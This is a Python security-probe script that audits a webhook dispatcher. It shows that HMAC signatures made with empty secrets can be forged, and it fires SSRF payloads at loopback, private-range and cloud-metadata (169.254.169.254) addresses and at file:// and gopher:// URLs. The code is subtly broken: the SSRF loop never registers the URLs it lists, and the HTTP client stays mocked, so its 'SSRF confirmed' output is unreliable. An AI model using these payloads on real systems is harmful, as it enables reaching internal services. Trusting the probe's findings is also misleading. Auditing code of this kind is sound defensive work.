"""notify-security probe 3: empty-secret forgery (corrected) + SSRF reachability.

Run:  python _probe_notify_ssrf.py
"""
from __future__ import annotations

import hashlib
import hmac
import socket
import threading
import time
from types import SimpleNamespace

from validsim.engine.scorecard import Scorecard
from validsim.notify import WebhookDispatcher
from validsim.notify import dispatcher as d

SIG = "X-ValidSim-Signature"


def card() -> Scorecard:
    return Scorecard(
        run_id="r", checkpoint_id="c", task_id="t", composite_score=90.0,
        success_rate=0.9, safety_score=1.0, robustness_score=1.0,
        regression_delta=0.0, confidence_interval=(0.8, 0.9),
        deploy_decision="APPROVE", threshold=85.0,
        created_at="2026-01-01T00:00:00+00:00", episode_count=10,
        failure_taxonomy={},
    )


def hr(t: str) -> None:
    print("\n" + "=" * 78 + f"\n{t}\n" + "=" * 78)


def main() -> None:
    hr("F(corrected) - EMPTY SECRET: attacker forges the exact body ValidSim sent")
    seen: list[dict] = []
    d.httpx.post = lambda url, **kw: (
        seen.append(dict(kw["headers"], body=kw["content"])),
        SimpleNamespace(status_code=200),
    )[1]
    for secret in ("", "   ", "\t"):
        seen.clear()
        dd = WebhookDispatcher(live=True)
        dd.register("ci", "https://x.example/h", secret=secret)
        dd.dispatch(card())
        body = seen[-1]["body"]
        sent = seen[-1][SIG]
        forge = hmac.new(secret.encode(), body.encode(), hashlib.sha256).hexdigest()
        print(f"  secret={secret!r}")
        print(f"    body sent          : {body[:50]!r}...")
        print(f"    sig on the wire    : {sent[:32]}...")
        print(f"    forge w/ public key: {forge[:32]}...")
        print(f"    *** ACCEPTED BY RECEIVER: {sent == forge} ***")
    print("\n  `register()` guards only `secret is not None` (dispatcher.py:219),")
    print("  so an empty/blank secret produces a signature that is cryptographically")
    print("  worthless while still LOOKING authenticated to the receiver.")

    # ------------------------------------------------------------------
    hr("D - SSRF: can a private / loopback / link-local target be reached?")
    # 1) a real local HTTP server standing in for an internal service
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(8)
    port = srv.getsockname()[1]
    hits: list[str] = []

    def serve() -> None:
        for _ in range(4):
            try:
                conn, _ = srv.accept()
            except OSError:
                return
            with conn:
                req = conn.recv(4096).decode("latin-1", "replace")
                hits.append(req.splitlines()[0] if req else "?")
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    print(f"  internal service listening on http://127.0.0.1:{port}/internal")
    print("  (stands in for a cloud metadata / internal admin endpoint)")

    d.time.sleep = lambda *_: None
    dd = WebhookDispatcher(live=True)
    for label, url in [
        ("loopback IPv4", f"http://127.0.0.1:{port}/internal"),
        ("loopback name", f"http://localhost:{port}/internal"),
        ("private RFC1918", f"http://10.0.0.7:{port}/internal"),
        ("link-local 169.254 metadata", f"http://169.254.169.254:{port}/latest/meta-data/"),
    ]:
        try:
            r = dd.dispatch(card())[-1]
            print(f"  {label:30} ok={r.ok} status={r.status_code} err={r.error}")
        except Exception as exc:
            print(f"  {label:30} EXCEPTION {type(exc).__name__}: {exc}")
    srv.close()
    print(f"\n  requests that actually reached the local socket: {len(hits)}")
    for h in hits:
        print(f"    {h}")
    print(f"\n  *** LOOPBACK SSRF CONFIRMED: {len(hits) > 0} ***")
    print("  register() (dispatcher.py:193-219) performs NO scheme/host/IP check;")
    print("  _post() (dispatcher.py:253) calls httpx.post(url) verbatim.")
    print("  Only failures observed are transport-level (no route), not policy.")

    # ------------------------------------------------------------------
    hr("D2 - non-HTTP schemes")
    for url in ("file:///c:/windows/win.ini",
                "gopher://127.0.0.1:11211/_stats",
                "ftp://127.0.0.1/"):
        d.httpx.post = lambda u, **kw: SimpleNamespace(status_code=200)
        try:
            d.WebhookDispatcher(live=True).register("x", url)
            d.WebhookDispatcher(live=True)
            print(f"  register({url!r}) -> ACCEPTED (no validation)")
        except Exception as exc:
            print(f"  register({url!r}) -> rejected: {exc}")

    hr("D3 - does the response BODY ever reach the caller? (exfil channel)")
    d.httpx.post = lambda u, **kw: SimpleNamespace(
        status_code=200, text="SECRET-INTERNAL-DATA", content=b"SECRET-INTERNAL-DATA")
    dd = WebhookDispatcher(live=True)
    dd.register("x", "https://x.example/h")
    (r,) = dd.dispatch(card())
    print(f"  DeliveryResult = {r!r}")
    print(f"  body captured anywhere: {'SECRET-INTERNAL-DATA' in repr(dd.sent)}")
    print("  -> only status_code/error are kept, so the response cannot be relayed")
    print("     through DeliveryResult. This LIMITS the SSRF to a blind write/GET.")


if __name__ == "__main__":
    main()
